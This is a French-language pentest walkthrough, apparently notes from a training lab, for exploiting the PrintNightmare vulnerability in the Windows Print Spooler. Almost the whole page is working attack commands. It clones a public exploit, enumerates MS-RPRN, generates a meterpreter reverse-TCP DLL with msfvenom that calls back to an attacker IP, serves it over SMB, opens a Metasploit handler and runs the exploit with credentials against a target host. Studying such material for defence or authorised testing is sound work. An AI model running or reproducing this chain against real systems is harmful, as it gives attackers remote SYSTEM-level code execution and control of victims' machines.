# PrintNightmare

### <mark style="color:red;">PrintNightmare</mark>

<mark style="color:blue;">**(CVE-2021-34527 & CVE-2021-1675)**</mark>

<mark style="color:green;">**Introduction**</mark>

PrintNightmare est le surnom donné à deux vulnérabilités critiques affectant **le service Print Spooler de Windows**. Ces vulnérabilités permettent à un attaquant d'exécuter du code à distance avec des privilèges système sur une machine cible.

<mark style="color:green;">**Préparation de l'attaque**</mark>

<mark style="color:orange;">**Clonage de l'exploit**</mark>

Nous utilisons l'exploit de cube0x0 disponible sur GitHub :

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

<mark style="color:orange;">**Installation de la version modifiée d'Impacket**</mark>

```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

<mark style="color:green;">**Enumération des services vulnérables**</mark>

Nous utilisons `rpcdump.py` pour vérifier si le protocole MS-RPRN est exposé sur la cible.

```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

Sortie attendue :

```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

<mark style="color:green;">**Génération du Payload**</mark>

Nous créons une DLL malveillante avec `msfvenom` :

{% code fullWidth="true" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
{% endcode %}

<mark style="color:green;">**Hébergement du Payload avec un Partage SMB**</mark>

Nous utilisons `smbserver.py` pour créer un partage SMB :

```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

<mark style="color:green;">**Configuration de Metasploit pour réceptionner la connexion**</mark>

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```

<mark style="color:green;">**Exécution de l'Exploit**</mark>

Nous lançons l'exploit contre la cible en lui fournissant le chemin vers le partage SMB contenant notre payload.

{% code overflow="wrap" fullWidth="true" %}
```bash
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
{% endcode %}

Sortie attendue :

```
[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
[+] Bind OK
[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
```
